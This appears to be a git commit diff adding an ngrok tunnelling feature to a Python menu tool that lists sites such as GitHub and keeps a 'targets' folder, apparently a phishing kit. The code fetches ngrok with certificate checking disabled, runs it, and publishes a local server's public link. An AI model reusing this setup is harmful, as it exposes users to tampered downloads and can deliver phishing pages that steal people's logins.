64d23d1572c78d987f1ceb5e381f83ae35e0e008
Gaurav Raj <techw803@gmail.com>
2020-12-04 12:52:57 +0530

    Added PortForwarding Feature

--- main.py
+++ main.py
@@ -6,6 +6,8 @@
 from termcolor import colored
 from os import system, listdir, mkdir
 import pyfiglet
+from time import sleep
+import json
 
 def ctarget():
 	if "targets" not in listdir():
@@ -23,11 +25,71 @@ def sites():
 {colored('4', 'yellow')} > {colored('GitHub', 'green')}"""
 	print(sites)
 
+def ngrok_check():
+    if 'ngrok' in listdir():
+        pass
+    else:
+        print(
+            f"\n{colored('[', 'green')}-{colored(']', 'green')} Ngrok not found, Downloading Ngrok...")
+        print(f"""\n----- Device Type ------
+{colored('[', 'green')}01{colored(']', 'green')} {colored('Android', 'yellow')}
+{colored('[', 'green')}02{colored(']', 'green')} {colored('PC, Laptop', 'yellow')}
+{colored('[', 'green')}03{colored(']', 'green')} {colored('Raspberry PI or Other SBC', 'yellow')}
+""")
+        choice = input(
+            f"{colored('[', 'green')}+{colored('] Choose Device Type : ', 'green')}")
+        if choice == "1" or choice == "01":
+            print(
+                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'green')}")
+            system(
+                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1')
+            system('unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1')
+            system('chmod +x ngrok')
+            system('rm -rf ngrok-stable-linux-arm.zip')
+            ngrok_portfwd()
+        elif choice == "2" or choice == "02":
+            print(
+                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'green')}")
+            system(
+                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1')
+            system('unzip ngrok-stable-linux-386.zip > /dev/null 2>&1')
+            system('chmod +x ngrok')
+            system('rm -rf ngrok-stable-linux-386.zip')
+            ngrok_portfwd()
+        elif choice == "3" or choice == "03":
+            print(
+                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'green')}")
+            system(
+                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1')
+            system('unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1')
+            system('chmod +x ngrok')
+            system('rm -rf ngrok-stable-linux-arm.zip')
+            ngrok_portfwd()
+        else:
+            print("Invalid Input, Try Again...")
+
+
+def ngrok_portfwd():
+    system("./ngrok http 5000 > /dev/null &")
+    sleep(10)
+    system("curl http://localhost:4040/api/tunnels > tunnels.json")
+
+    with open('tunnels.json') as data_file:
+        datajson = json.load(data_file)
+
+    link = ""
+    for i in datajson['tunnels']:
+        link = link + i['public_url'] + '\n'
+    print(
+        f"""{colored('[', 'green')}+{colored('] Direct Link: ', 'green')} {colored(link[29:], 'yellow')}""")
+
 if __name__ == '__main__':
 	try:
 		ctarget()
 		banner()
+		ngrok_check()
 		sites()
+		ngrok_portfwd()
 		print()
 		site_opt = input(f"{colored('[', 'green')}{colored('x', 'red')}{colored(']', 'green')} {colored('Enter Number : ', 'green')}")
 		if site_opt == "1":
